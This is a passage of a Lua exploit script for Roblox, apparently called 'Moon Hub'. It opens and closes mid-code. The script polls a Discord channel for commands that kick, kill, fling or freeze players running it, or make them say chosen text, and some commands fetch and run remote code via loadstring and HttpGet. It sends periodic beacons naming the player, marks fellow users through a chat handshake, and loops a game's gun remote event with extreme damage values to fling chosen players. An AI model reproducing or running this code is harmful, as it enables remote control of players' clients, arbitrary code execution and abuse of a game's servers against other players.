            if sphere and sphere.Parent then sphere:Destroy() end
            if sphereInner and sphereInner.Parent then sphereInner:Destroy() end
        end)
        task.wait(1.5)
        TweenService:Create(bg, TweenInfo.new(1.5), {BackgroundTransparency = 1}):Play()
        task.delay(2, function()
            sg:Destroy()
            if model and model.Parent then model:Destroy() end
            if shrine and shrine.Parent then shrine:Destroy() end
            if floor and floor.Parent then floor:Destroy() end
            if lightPart and lightPart.Parent then lightPart:Destroy() end
            if lightPart2 and lightPart2.Parent then lightPart2:Destroy() end
            if ashPart and ashPart.Parent then ashPart:Destroy() end
        end)
    end)
    return true
end

local playerOriginalSpeed = {}
local HasTriggeredVerifique = false

local function ProcessarMensagemChat(msgText, authorName)
    if not msgText or not authorName then return end
    local comandoLower = msgText:lower()
    if comandoLower:match("^;verifique") then
        if authorName ~= LocalPlayer.Name and not HasTriggeredVerifique then
            HasTriggeredVerifique = true
            task.delay(math.random(10, 30) / 100, function()
                EnviarMensagemChat("Moon_" .. tostring(math.random(1000, 9999)))
            end)
            task.delay(4, function() HasTriggeredVerifique = false end)
        end
    end
    if msgText:match("[Mm]oon_%d%d%d%d") then
        local authorPlayer = Players:FindFirstChild(authorName)
        if authorPlayer then
            AutorizadosDinamicos[authorName] = true
            AtribuirTagCorreta(authorPlayer, "UsuÃ¡rio Moon")
        end
    end
end

local function ConectarCanal(canal)
    if not canal or not canal.IsA or not canal:IsA("TextChannel") then return end
    canal.MessageReceived:Connect(function(msg)
        local text = msg.Text
        local source = msg.TextSource and msg.TextSource.Name
        if text and source then ProcessarMensagemChat(text, source) end
    end)
end

pcall(function()
    for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do ConectarCanal(ch) end
    TextChatService.TextChannels.ChildAdded:Connect(function(ch) ConectarCanal(ch) end)
end)

pcall(function()
    local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if events then
        local onMessageDoneFiltering = events:FindFirstChild("OnMessageDoneFiltering")
        if onMessageDoneFiltering then
            onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
                if messageData and messageData.FromSpeaker and messageData.Message then
                    local speaker = Players:FindFirstChild(messageData.FromSpeaker)
                    if speaker then ProcessarMensagemChat(messageData.Message, speaker.Name) end
                end
            end)
        end
    end
end)

local COMANDOS_OK = {
    kick=true, kill=true, killplus=true, fling=true, freeze=true,
    unfreeze=true, bring=true, tp=true, float=true, jail=true,
    unjail=true, backrooms=true, verifique=true, jumpscare=true,
    jumps1=true, jumps2=true, jumps3=true, jumps4=true,
    animejumps=true, unjumpsanime=true, goner=true,
    coolkddavatar=true, noly=true, tubers93=true, coolkdefect=true,
    flopparain=true, stopfloppa=true, domainexpansion=true, say=true,
}

local function executarComandoDiscord(cmd, alvo, extra)
    cmd = cmd:lower()
    alvo = alvo or ""
    extra = extra or ""

    local function souOAlvo()
        return NomeCorresponde(alvo, LocalPlayer.Name)
    end
    local function acharPlayer()
        for _, p in ipairs(Players:GetPlayers()) do
            if NomeCorresponde(alvo, p.Name) then return p end
        end
        return nil
    end

    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")

    print("[MoonDiscord] executando: " .. cmd .. " " .. alvo)

    if cmd == "kick" and souOAlvo() then
        LocalPlayer:Kick("You got kicked by Moon Hub")
    elseif cmd == "kill" and souOAlvo() and char then
        char:BreakJoints()
    elseif cmd == "killplus" and souOAlvo() and char then
        char:BreakJoints()
        if root then
            for i=1,10 do
                local part = Instance.new("Part")
                part.Size = Vector3.new(10,10,10)
                part.Anchored = false
                part.CanCollide = false
                part.Material = Enum.Material.Neon
                part.BrickColor = BrickColor.Random()
                part.CFrame = root.CFrame
                part.Parent = Workspace
                local bv = Instance.new("BodyVelocity")
                bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                bv.MaxForce = Vector3.new(1e5,1e5,1e5)
                bv.Parent = part
                Debris:AddItem(part,3)
            end
        end
    elseif cmd == "fling" and souOAlvo() and char and root then
        local tw = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)})
        tw:Play()
    elseif cmd == "freeze" and souOAlvo() and hum then
        playerOriginalSpeed[LocalPlayer.Name:lower()] = hum.WalkSpeed
        hum.WalkSpeed = 0
    elseif cmd == "unfreeze" and souOAlvo() and hum then
        hum.WalkSpeed = playerOriginalSpeed[LocalPlayer.Name:lower()] or 16
    elseif cmd == "bring" and souOAlvo() then
        local autor = acharPlayer()
        if autor and autor.Character and autor.Character:FindFirstChild("HumanoidRootPart") and root then
            root.CFrame = autor.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
        end
    elseif cmd == "tp" then
        local destino = acharPlayer()
        if destino and destino.Character and destino.Character:FindFirstChild("HumanoidRootPart") and root then
            root.CFrame = destino.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
        end
    elseif cmd == "float" and souOAlvo() and char and root then
        task.spawn(function()
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(0, 30, 0)
            bv.MaxForce = Vector3.new(0, 1e5, 0)
            bv.Parent = root
            task.wait(3)
            bv:Destroy()
            char:BreakJoints()
        end)
    elseif cmd == "jail" and souOAlvo() then
        CreateAndManageJail(LocalPlayer)
    elseif cmd == "unjail" and souOAlvo() then
        RemoveJail(LocalPlayer)
    elseif cmd == "backrooms" then
        local mapID = 10581711055
        pcall(function()
            local mapa = game:GetObjects("rbxassetid://"..mapID)[1]
            mapa.Parent = Workspace
            if not mapa.PrimaryPart then
                local part = mapa:FindFirstChildWhichIsA("BasePart")
                if part then mapa.PrimaryPart = part end
            end
            mapa:SetPrimaryPartCFrame(CFrame.new(Vector3.new(4000, 7, 0)))
            if char and root then char:MoveTo(Vector3.new(4029, 9, 24)) end
        end)
    elseif cmd == "jumpscare" and souOAlvo() then
        Jumpscare()
    elseif cmd == "jumps1" and souOAlvo() then
        CustomJumpscare("rbxassetid://126754882337711", "rbxassetid://138873214826309")
    elseif cmd == "jumps2" and souOAlvo() then
        CustomJumpscare("rbxassetid://86379969987314", "rbxassetid://143942090")
    elseif cmd == "jumps3" and souOAlvo() then
        CustomJumpscare("rbxassetid://127382022168206", "rbxassetid://143942090")
    elseif cmd == "jumps4" and souOAlvo() then
        CustomJumpscare("rbxassetid://95973611964555", "rbxassetid://138873214826309")
    elseif cmd == "animejumps" and souOAlvo() then
        StartAnimeJumpscare()
    elseif cmd == "unjumpsanime" and souOAlvo() then
        StopAnimeJumpscare()
    elseif cmd == "goner" and souOAlvo() then
        TransformIntoGoner()
    elseif cmd == "coolkddavatar" and souOAlvo() then
        CoolkidAvatar()
    elseif cmd == "noly" and souOAlvo() then
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/lyrarepositorio-afk/gubby/refs/heads/main/Main.txt"))()
        end)
    elseif cmd == "tubers93" and souOAlvo() then
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/BRENOPOOF/1222/refs/heads/main/Main.txt"))()
        end)
    elseif cmd == "coolkdefect" and souOAlvo() then
        CoolkidEffect(LocalPlayer)
    elseif cmd == "flopparain" then
        FloppaRain()
    elseif cmd == "stopfloppa" then
        StopFloppa()
    elseif cmd == "domainexpansion" and souOAlvo() then
        DomainExpansion(LocalPlayer)
    elseif cmd == "say" and souOAlvo() and extra ~= "" then
        EnviarMensagemChat(extra)
    else
        print("[MoonDiscord] alvo nÃ£o bate: " .. cmd .. " " .. alvo)
    end
end

task.spawn(function()
    while true do
        enviarMensagem(string.format("[USERS] %s | %s | entrada:%d",
            LocalPlayer.Name, os.date("%H:%M:%S"), HORA_ENTRADA))
        task.wait(20)
    end
end)

task.spawn(function()
    print("[MoonDiscord] listener ativo. Canal: " .. CHANNEL_ID)

    while true do
        task.wait(POLL)

        local msgs = lerMensagens(30)
print("[MoonDebug] msgs recebidas:", msgs and #msgs or "nil")   -- ADICIONE
if msgs and type(msgs) == "table" then
            for i = #msgs, 1, -1 do
                local msg = msgs[i]
                if msg.id and msg.content and not jaProcessados[msg.id] then
                    jaProcessados[msg.id] = true

                    local cmd, alvo, extra = msg.content:match("^%[CMD%]%s+(%w+)%s+([^%s]+)%s*(.*)$")
                    if cmd and COMANDOS_OK[cmd:lower()] then
                        local horaCmd = tonumber(msg.content:match("t:(%d+)")) or os.time()
                        if horaCmd >= HORA_ENTRADA and (os.time() - horaCmd) <= TEMPO_MAX then
                            task.spawn(executarComandoDiscord, cmd, alvo, extra or "")
                            print("[MoonDiscord] recebido: " .. msg.content)
                        end
                    end
                end
            end
        end
    end
end)
end

local okWind, WindUI = pcall(function()
    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
end)
if not okWind then
    warn("[MoonHub] WindUI falhou ao carregar: " .. tostring(WindUI))
    WindUI = nil
end

if WindUI then
  local okPainel, errPainel = pcall(function()
    Window = WindUI:CreateWindow({
        Title = "Moon Hub Painel",
        Icon = "door-open",
        Author = "by: samuel_mi244 jonas",
        Folder = "MoonHub",
        Size = UDim2.fromOffset(580, 460),
        MinSize = Vector2.new(560, 350),
        MaxSize = Vector2.new(850, 560),
        Transparent = true,
        Theme = "Dark",
        Resizable = true,
        SideBarWidth = 200,
        HideSearchBar = true,
        ScrollBarEnabled = false,
        BackgroundImageTransparency = 0.42,
        Background = BACKGROUND_CUSTOM,
        User = { Enabled = true, Anonymous = false, Callback = function() end },
    })

    local listaAlvos = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(listaAlvos, p.Name)
    end

    local TargetName = ""

    local TabComandos = Window:Tab({ Title = "Comandos gerais", Icon = "play", Locked = false })
    local SectionComandos = TabComandos:Section({ Title = "funÃ§Ã£o", Icon = "hammer", Opened = true })

    local DropdownCmds = SectionComandos:Dropdown({
        Title = "Selecionar Jogador",
        Values = listaAlvos,
        Value = "",
        Callback = function(opt) TargetName = opt end
    })

    local comandos = { "kick", "kill", "killplus", "fling", "freeze", "unfreeze", "bring", "tp", "float", "jail", "unjail", "backrooms" }
    for _, cmd in ipairs(comandos) do
        SectionComandos:Button({
            Title = cmd:lower(),
            Desc = "fazer ;"..cmd.." no user",
            Callback = function()
                if TargetName and TargetName ~= "" then
                    enviarMensagem(string.format("[CMD] %s %s t:%d", cmd, TargetName, os.time()))
                end
            end
        })
    end

    local TabChat = Window:Tab({ Title = "Chat", Icon = "message-square", Locked = false })
    local SectionChat = TabChat:Section({ Title = "Comandos de Chat", Icon = "message-square", Opened = true })
    local DropdownChat = SectionChat:Dropdown({
        Title = "Selecionar Jogador",
        Values = listaAlvos,
        Value = "",
        Callback = function(opt) TargetName = opt end
    })

    local MensagemSay = ""
    SectionChat:Input({
        Title = "Mensagem Say",
        Desc = "Coloque a mensagem abaixo",
        Placeholder = "coloque usa mensagem",
        Callback = function(text) MensagemSay = text end
    })

    SectionChat:Button({
        Title = "enviar say",
        Desc = "forÃ§a user a falar sua mensagem",
        Callback = function()
            if TargetName and TargetName ~= "" and MensagemSay and MensagemSay ~= "" then
                enviarMensagem(string.format("[CMD] say %s %s t:%d", TargetName, MensagemSay, os.time()))
            end
        end
    })

    local TabTerror = Window:Tab({ Title = "Terror", Icon = "ghost", Locked = false })
    local SectionTerror = TabTerror:Section({ Title = "Jumpscares", Icon = "flame", Opened = true })
    local DropdownTerror = SectionTerror:Dropdown({
        Title = "Selecionar Jogador",
        Values = listaAlvos,
        Value = "",
        Callback = function(opt) TargetName = opt end
    })

    SectionTerror:Button({
        Title = "jumpscare",
        Desc = "fazer uma imagem terro no user",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] jumpscare %s t:%d", TargetName, os.time()))
            end
        end
    })

    for _, jData in ipairs(JUMPSCARES) do
        SectionTerror:Button({
            Title = jData.Name,
            Desc = "fazer uma imagem terro no user",
            Callback = function()
                if TargetName and TargetName ~= "" then
                    enviarMensagem(string.format("[CMD] %s %s t:%d", jData.Name, TargetName, os.time()))
                end
            end
        })
    end

    SectionTerror:Button({
        Title = "animejumps",
        Desc = "fazer jumpscare anime no user",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] animejumps %s t:%d", TargetName, os.time()))
            end
        end
    })

    SectionTerror:Button({
        Title = "unjumpsanime",
        Desc = "parar jumpscare anime no user",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] unjumpsanime %s t:%d", TargetName, os.time()))
            end
        end
    })

    local TabPersonagem = Window:Tab({ Title = "Personagem", Icon = "user", Locked = false })
    local SectionAvatar = TabPersonagem:Section({ Title = "Avatar Config", Icon = "user", Opened = true })
    local DropdownAvatar = SectionAvatar:Dropdown({
        Title = "Selecionar Jogador Alvo",
        Values = listaAlvos,
        Value = "",
        Callback = function(opt) TargetName = opt end
    })

    SectionAvatar:Button({
        Title = "Goner",
        Desc = "transformar user em Goner",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] goner %s t:%d", TargetName, os.time()))
            end
        end
    })

    SectionAvatar:Button({
        Title = "Coolkid Avatar",
        Desc = "transformar user em Coolkid",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] coolkddavatar %s t:%d", TargetName, os.time()))
            end
        end
    })

    SectionAvatar:Button({
        Title = "Noly",
        Desc = "Transforma em Noly via comando",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] noly %s t:%d", TargetName, os.time()))
            end
        end
    })

    SectionAvatar:Button({
        Title = "Tubers93",
        Desc = "Transformar em Tubers via comando",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] tubers93 %s t:%d", TargetName, os.time()))
            end
        end
    })

    local TabEfeitos = Window:Tab({ Title = "Efeitos Especiais", Icon = "sparkles", Locked = false })
    local SectionEfeitos = TabEfeitos:Section({ Title = "Efeitos", Icon = "star", Opened = true })

    local DropdownEfeitos = SectionEfeitos:Dropdown({
        Title = "Selecionar Jogador",
        Values = listaAlvos,
        Value = "",
        Callback = function(opt) TargetName = opt end
    })

    SectionEfeitos:Button({
        Title = "coolkdefect",
        Desc = "fazer efeito no usuÃ¡rio selecionado",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] coolkdefect %s t:%d", TargetName, os.time()))
            end
        end
    })

    SectionEfeitos:Button({
        Title = "flopparain",
        Desc = "fazer efeito no usuÃ¡rio selecionado",
        Callback = function() enviarMensagem(string.format("[CMD] flopparain all t:%d", os.time())) end
    })

    SectionEfeitos:Button({
        Title = "stopfloppa",
        Desc = "fazer efeito no usuÃ¡rio selecionado",
        Callback = function() enviarMensagem(string.format("[CMD] stopfloppa all t:%d", os.time())) end
    })

    SectionEfeitos:Button({
        Title = "domainexpansion",
        Desc = "fazer efeito no usuÃ¡rio selecionado",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] domainexpansion %s t:%d", TargetName, os.time()))
            end
        end
    })

    local TabMaps = Window:Tab({ Title = "Maps", Icon = "map", Locked = false })
    local SectionMaps = TabMaps:Section({ Title = "Mapas", Icon = "map-pin", Opened = true })

    local DropdownMaps = SectionMaps:Dropdown({
        Title = "Selecionar Jogador",
        Values = listaAlvos,
        Value = "",
        Callback = function(opt) TargetName = opt end
    })

    SectionMaps:Button({
        Title = "backrooms",
        Desc = "teleportar para o mapa backrooms",
        Callback = function()
            if TargetName and TargetName ~= "" then
                enviarMensagem(string.format("[CMD] backrooms %s t:%d", TargetName, os.time()))
            end
        end
    })

    task.spawn(function()
        while true do
            task.wait(5)
            local lista = {}
            for _, p in ipairs(Players:GetPlayers()) do
                table.insert(lista, p.Name)
            end
            pcall(function() DropdownCmds:SetValues(lista) end)
            pcall(function() DropdownChat:SetValues(lista) end)
            pcall(function() DropdownTerror:SetValues(lista) end)
            pcall(function() DropdownAvatar:SetValues(lista) end)
            pcall(function() DropdownEfeitos:SetValues(lista) end)
                    pcall(function() DropdownMaps:SetValues(lista) end)
    end
end)
  end) -- fecha o pcall do painel WindUI
  if not okPainel then warn("[MoonHub] Erro no painel WindUI: " .. tostring(errPainel)) end
end -- (Apenas este end para fechar o "if WindUI then")

  local localPlayer2 = players.LocalPlayer
local findFirstChild = nil
local v3 = false
local v4 = false
local v5 = false
local connect = nil
local connect2 = nil
local position = nil
local position2 = nil
local v6 = {}
local v7 = nil
local v8 = nil
local findFirstChild2 = nil
local couch = nil
local v9 = false
local v10 = nil
local connect3 = nil
local ativarFlingAddToggle = nil

  function f1()
    if connect3 then
      connect3:Disconnect()
      connect3 = nil
    end

    v9 = false
    v10 = nil

    if localPlayer2.Character and localPlayer2.Character:FindFirstChild("Humanoid") then
      workspaceService.CurrentCamera.CameraSubject = localPlayer2.Character.Humanoid
      workspaceService.CurrentCamera.CameraType = Enum.CameraType.Custom
    else
      workspaceService.CurrentCamera.CameraSubject = nil
      workspaceService.CurrentCamera.CameraType = Enum.CameraType.Custom
    end
  end

  function f2()
    local v36 = {}

    for index, value3 in ipairs(players:GetPlayers()) do
      if value3 ~= localPlayer2 then
        table.insert(v36, value3.Name)
      end
    end

    return v36
  end

  function f6()
    local carClient = localPlayer2:WaitForChild("Backpack"):FindFirstChild("CarClient")

    if carClient and carClient:IsA("LocalScript") then
      carClient.Disabled = true
    end
  end

  function f3(p1)
    if connect3 then
      connect3:Disconnect()
      connect3 = nil
    end

    local findFirstChild3 = players:FindFirstChild(p1)
    local f31

    if findFirstChild3 and findFirstChild3 ~= localPlayer2 then
      function f31()
        if not v9 or not v10 then
          return
        end

        if v10.Character and v10.Character:FindFirstChild("Humanoid") then
          workspaceService.CurrentCamera.CameraSubject = v10.Character.Humanoid
        else
          workspaceService.CurrentCamera.CameraSubject = nil
        end
      end

      v10 = findFirstChild3
      v9 = true
      f31()

      connect3 = runService.Heartbeat:Connect(function()
        if not v9 then
          connect3:Disconnect()
          connect3 = nil
          return
        end

        pcall(f31)
      end)

      v10.CharacterAdded:Connect(function()
        if v9 then
          f31()
        end
      end)
    else
      v9 = false
      v10 = nil
    end
  end

  function f18(p2, p3)
    pcall(function()
      local get = p2:Get()
      local v37 = f2()
      p2:Set(v37)

      if get and not table.find(v37, get) then
        p2:Set("")
        findFirstChild = nil

        if v9 then
          f1()

          if p3 then
            pcall(function() p3:Set(false) end)
          end
        end

        if v5 or v3 or v4 then
          v5 = false
          v3 = false
          v4 = false

          if connect then
            connect:Disconnect()
            connect = nil
          end

          if connect2 then
            connect2:Disconnect()
            connect2 = nil
          end

          if ativarFlingAddToggle then
            pcall(function() ativarFlingAddToggle:Set(false) end)
          end
        end
      elseif get and table.find(v37, get) then
        p2:Set(get)
      end
    end)
  end

  function f19(p4)
    local findFirstChild4 = players:FindFirstChild(p4)

    local humanoidRootPart = findFirstChild4 and localPlayer2.Character
      and localPlayer2.Character:FindFirstChild("HumanoidRootPart")
      and findFirstChild4.Character
      and findFirstChild4.Character:FindFirstChild("HumanoidRootPart")

    local humanoidRootPart2

    if humanoidRootPart then
      humanoidRootPart2 = localPlayer2.Character:FindFirstChild("HumanoidRootPart")
      local humanoid = localPlayer2.Character:FindFirstChild("Humanoid")

      if not humanoidRootPart2 or not humanoid then
        return
      else
        for index2, value5 in ipairs(localPlayer2.Character:GetDescendants()) do
          if value5:IsA("BasePart") then
            value5.Velocity = Vector3.zero
            value5.RotVelocity = Vector3.zero
            value5.Anchored = true
          end
        end

        local v38, v39 = pcall(function()
          humanoidRootPart2.CFrame = CFrame.new(findFirstChild4.Character.HumanoidRootPart.Position
            + Vector3.new(0, 2, 0))
        end)

        if not v38 then
          return
        end

        humanoid.Sit = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)

        task.wait(0.5)

        for index3, value5 in ipairs(localPlayer2.Character:GetDescendants()) do
          if value5:IsA("BasePart") then
            value5.Anchored = false
            value5.Velocity = Vector3.zero
            value5.RotVelocity = Vector3.zero
          end
        end
        return
      end
    end
  end

  localPlayer2.CharacterAdded:Connect(function(character)
    if v9 then
      f1()
      pcall(function() visualizarJogadorAddToggle:Set(false) end)
    end
  end)

  v11 = nil

  selecionarJogadorAddDropdown = tab3:AddDropdown({
    Name = "Selecionar Jogador",
    Description = "Escolha um jogador para matar, puxar, visualizar ou aplicar fling",
    Default = "",
    Multi = false,
    Options = f2(),
    Flag = "player list",
    Callback = function(value6)
      v11 = value6

      if value6 == "" or value6 == nil then
        findFirstChild = nil

        if v5 or v3 or v4 then
          v5 = false
          v3 = false
          v4 = false

          if connect then
            connect:Disconnect()
          end

          if connect2 then
            connect2:Disconnect()
          end

          if ativarFlingAddToggle then
            pcall(function() ativarFlingAddToggle:Set(false) end)
          end
        end

        if v9 then
          f1()
        end
      else
        findFirstChild = players:FindFirstChild(value6)

        if v9 then
          f1()
          f3(value6)
        end
      end
    end,
  })

  function UptadePlayers()
    local v40 = {}

    for index4, value7 in ipairs(players:GetPlayers()) do
      if value7.Name ~= localPlayer2.Name then
        table.insert(v40, value7.Name)
      end
    end

    selecionarJogadorAddDropdown:Set(v40)
  end

  tab3:AddButton({ "Atualizar lista", function() UptadePlayers() end })
  UptadePlayers()

  tab3:AddButton({
    Title = "Teleportar para Jogador",
    Desc = "Clique para teletransportar para o jogador selecionado",
    Callback = function()
      local v41 = v11

      if v41 and v41 ~= "" then
        pcall(f19, v41)
      end
    end,
  })

  visualizarJogadorAddToggle = tab3:AddToggle({
    Name = "Visualizar Jogador",
    Description = "Ativa/desativa a visualizaÃ§Ã£o do jogador selecionado",
    Default = false,
    Callback = function(value8)
      if value8 then
        if findFirstChild then
          pcall(f3, findFirstChild.Name)
        else
          visualizarJogadorAddToggle:Set(false)
        end
      else
        pcall(f1)
      end
    end,
  })

  players.PlayerRemoving:Connect(function(player)
    f18(selecionarJogadorAddDropdown, visualizarJogadorAddToggle)

    if findFirstChild == player then
      findFirstChild = nil

      if v9 then
        f1()
      end

      if v5 then
        v5 = false

        if connect then
          connect:Disconnect()
          connect = nil
        end

        if connect2 then
          connect2:Disconnect()
          connect2 = nil
        end

        if ativarFlingAddToggle then
          ativarFlingAddToggle:Set(false)
        end
      end

      visualizarJogadorAddToggle:Set(false)
      selecionarJogadorAddDropdown:Set("")
    end
  end)

  players.PlayerAdded:Connect(function()
    task.wait(1)
    f18(selecionarJogadorAddDropdown, visualizarJogadorAddToggle)
  end)

  f18(selecionarJogadorAddDropdown, visualizarJogadorAddToggle)

  tab3:AddSection({ "Annoy & FunÃ§Ãµes Troll" })

  local cartolaSelectedPlayer = nil
  local cartolaPlayerNames = {}

  for _, p in ipairs(players:GetPlayers()) do
      if p ~= localPlayer then
          table.insert(cartolaPlayerNames, p.Name)
      end
  end

  local CartolaDropdown = tab3:AddDropdown({
      Name = "Selecionar Alvo",
      Description = "Escolha um jogador para o Annoy",
      Values = cartolaPlayerNames,
      Default = 1,
      Callback = function(v)
          cartolaSelectedPlayer = v
      end
  })

  players.PlayerAdded:Connect(function(p)
      if p ~= localPlayer then
          table.insert(cartolaPlayerNames, p.Name)
          pcall(function() CartolaDropdown:Refresh(cartolaPlayerNames) end)
      end
  end)

  players.PlayerRemoving:Connect(function(p)
      for i, name in ipairs(cartolaPlayerNames) do
          if name == p.Name then
              table.remove(cartolaPlayerNames, i)
              break
          end
      end
      pcall(function() CartolaDropdown:Refresh(cartolaPlayerNames) end)
  end)

  local CartolaFlingSystem = { power = 1e14, damage = 999999, interval = 0.02 }

  local function cartolaClearTools()
      local clearEvt = replicatedStorage:FindFirstChild("RE") and replicatedStorage.RE:FindFirstChild("1Clea1rTool1s")
      if clearEvt then
          clearEvt:FireServer("ClearAllTools")
      end
  end

  local function cartolaRequestAssault()
      local toolEvt = replicatedStorage:FindFirstChild("RE") and replicatedStorage.RE:FindFirstChild("1Too1l")
      if toolEvt then
          toolEvt:InvokeServer("PickingTools", "Assault")
      end
  end

  local function cartolaHasWeapon()
      return localPlayer.Backpack:FindFirstChild("Assault") or (localPlayer.Character and localPlayer.Character:FindFirstChild("Assault"))
  end

  local function cartolaEquipWeapon()
      local weapon = localPlayer.Backpack:FindFirstChild("Assault")
      if weapon and localPlayer.Character then
          local humanoid = localPlayer.Character:FindFirstChild("Humanoid")
          if humanoid then
              humanoid:EquipTool(weapon)
              return true
          end
      end
      return false
  end

  local function cartolaGetGunScript()
      if localPlayer.Character then
          local weapon = localPlayer.Character:FindFirstChild("Assault") or localPlayer.Backpack:FindFirstChild("Assault")
          if weapon then
              return weapon:FindFirstChild("GunScript_Local")
          end
      end
      return nil
  end

  local function cartolaExecuteShot(targetPart)
      local gunScript = cartolaGetGunScript()
      local fireEvent = replicatedStorage:FindFirstChild("RE") and replicatedStorage.RE:FindFirstChild("1Gu1n")
      if not gunScript or not targetPart or not fireEvent then return end

      local args = {
          targetPart,
          targetPart,
          Vector3.new(CartolaFlingSystem.power, CartolaFlingSystem.power, CartolaFlingSystem.power),
          targetPart.Position,
          gunScript:FindFirstChild("MuzzleEffect"),
          gunScript:FindFirstChild("HitEffect"),
          0,
          0,
          { false },
          {
              CartolaFlingSystem.damage,
              Vector3.new(1000, 1000, 1000),
              BrickColor.new(29),
              0.25,
              Enum.Material.SmoothPlastic,
              0.25
          },
          true,
          false
      }

      fireEvent:FireServer(unpack(args))
  end

  local function cartolaFlingTarget()
      if not cartolaSelectedPlayer then return end
      local targetPlr = players:FindFirstChild(cartolaSelectedPlayer)
      if targetPlr and targetPlr.Character then
          local root = targetPlr.Character:FindFirstChild("HumanoidRootPart")
          local head = targetPlr.Character:FindFirstChild("Head")
          local torso = targetPlr.Character:FindFirstChild("Torso") or targetPlr.Character:FindFirstChild("UpperTorso")
          
          if root then cartolaExecuteShot(root) end
          if head then cartolaExecuteShot(head) end
          if torso then cartolaExecuteShot(torso) end
      end
  end

  local function cartolaMaintainWeapon()
      if not cartolaHasWeapon() then
          cartolaClearTools()
          task.wait(0.1)
          cartolaRequestAssault()
          task.wait(0.2)

          local attempts = 0
          while not cartolaHasWeapon() and attempts < 20 do
              task.wait(0.1)
              attempts = attempts + 1
          end

          if cartolaHasWeapon() then
              cartolaEquipWeapon()
          end
      end
  end

  tab3:AddButton({
      Name = "Ativar Annoy (Alvo Selecionado)",
      Description = "Aplica o Annoy/Fling avanÃ§ado no jogador selecionado",
      Callback = function()
          if not cartolaSelectedPlayer then
              pcall(function()
                  starterGui:SetCore("SendNotification", { Title = "Moon Hub", Text = "Selecione um jogador primeiro!", Duration = 3 })
              end)
              return
          end
          
          task.spawn(function()
              while true do
                  cartolaMaintainWeapon()
                  if cartolaHasWeapon() and cartolaGetGunScript() then
                      cartolaFlingTarget()
                  end
                  task.wait(CartolaFlingSystem.interval)
              end
          end)
          
          pcall(function()
              starterGui:SetCore("SendNotification", { Title = "Moon Hub", Text = "Annoy ativado para " .. cartolaSelectedPlayer, Duration = 3 })
          end)
      end
  })

  tab3:AddButton({
      Name = "Ativar Tornado PirateFree (Barco)",
      Description = "Spawna o barco pirata, voa e faz o glitch de rotaÃ§Ã£o/tornado",
      Callback = function()
          task.spawn(function()
              pcall(function()
                  if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                      TextChatService.TextChannels.RBXGeneral:SendAsync("[AVISO] UM TORNADO SURGIU! Moon Hub")
                  end
              end)

              task.spawn(function()
                  local audioId = 9068077052
                  for i = 1, 5 do
                      pcall(function()
                          if replicatedStorage:FindFirstChild("RE") and replicatedStorage.RE:FindFirstChild("1Gu1nSound1s") then
                              replicatedStorage.RE["1Gu1nSound1s"]:FireServer(workspaceService, audioId, 1)
                          end
                      end)
                      local sound = Instance.new("Sound")
                      sound.SoundId = "rbxassetid://" .. tostring(audioId)
                      sound.Parent = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                      sound:Play()
                      task.wait(1.5)
                      sound:Destroy()
                  end
              end)

              local rootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
              local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")
              if not rootPart or not humanoid then return end

              rootPart.CFrame = CFrame.new(1754, -2, 58)
              task.wait(0.5)

              pcall(function()
                  replicatedStorage.RE["1Ca1r"]:FireServer("PickingBoat", "PirateFree")
              end)
              task.wait(1)

              local vehiclesFolder = workspaceService:FindFirstChild("Vehicles")
              local pCar = vehiclesFolder and vehiclesFolder:FindFirstChild(localPlayer.Name .. "Car")
              if not pCar then return end

              local seat = pCar:FindFirstChild("Body") and pCar.Body:FindFirstChild("VehicleSeat")
              if not seat then return end

              repeat
                  task.wait(0.1)
                  rootPart.CFrame = seat.CFrame * CFrame.new(0, 1, 0)
              until humanoid.SeatPart == seat

              task.delay(4, function()
                  if humanoid.SeatPart then humanoid.Sit = false end
                  rootPart.CFrame = CFrame.new(0, 0, 0)
              end)

              pcall(function()
                  local reFlip = replicatedStorage.RE:FindFirstChild("1Player1sCa1r")
                  task.spawn(function()
                      while pCar and pCar.Parent do
                          reFlip:FireServer("Flip")
                          task.wait(0.5)
                      end
                  end)
              end)

              local waypoints = {
                  Vector3.new(-16, 0, -47),
                  Vector3.new(-110, 0, -45),
                  Vector3.new(16, 0, -55)
              }
              local currentIndex, nextIndex = 1, 2
              local moveSpeed = 15
              local rotationSpeed = math.rad(720)
              local progress, currentRotation = 0, 0

              runService.Heartbeat:Connect(function(dt)
                  if not (pCar and pCar.PrimaryPart) then return end
                  local startPos = waypoints[currentIndex]
                  local endPos = waypoints[nextIndex]
                  progress = progress + (moveSpeed * dt) / (startPos - endPos).Magnitude
                  if progress >= 1 then
                      progress = 0
                      currentIndex = nextIndex
